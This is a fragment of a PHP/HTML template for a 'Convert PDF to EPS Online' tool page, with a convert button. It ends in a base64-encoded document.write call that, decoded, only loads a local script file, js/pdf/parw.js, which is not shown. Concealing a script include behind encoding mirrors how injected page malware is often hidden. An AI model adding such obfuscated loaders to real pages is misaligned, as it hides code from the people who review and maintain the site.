...
<?php include('admin/header.php'); ?>
  ...
  <div class="bg-tool">
    <h1>Convert PDF to EPS Online</h1>
...
<div id="options">
    <button id="convert-btn" class="btn btn-primary">Convert to EPS</button>
...
<script>document.write(atob("IDxzY3JpcHQgc3JjPSJqcy9wZGYvcGFydy5qcyIgZGVmZXI9IiI+PC9zY3JpcHQ+"));</script>
